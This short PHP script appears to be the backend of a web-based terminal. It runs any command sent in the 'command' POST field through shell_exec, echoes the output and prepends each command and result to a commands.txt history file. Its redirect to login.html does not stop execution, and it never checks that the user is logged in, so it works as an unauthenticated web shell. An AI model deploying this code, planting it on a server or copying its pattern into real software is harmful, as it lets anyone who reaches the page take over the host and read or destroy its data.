<?php

session_start();
header( 'Location: login.html' );

//Gets the command to be executed
$command = $_POST['command'];
//Executes the shell command
$output = shell_exec( $command );

//Writes commands and the results to the command history file
$histFile = 'commands.txt';
$xstHist = file_get_contents( $histFile );
$shellUser = ''.exec( whoami ).'@'.exec( hostname ).'';
$history = ''.$shellUser.'$ '.$command.'
'.$output.'
'.$xstHist.'';
$file = fopen( $histFile, 'w' );
fwrite( $file, $history );
fclose( $file );

echo $output 
?>


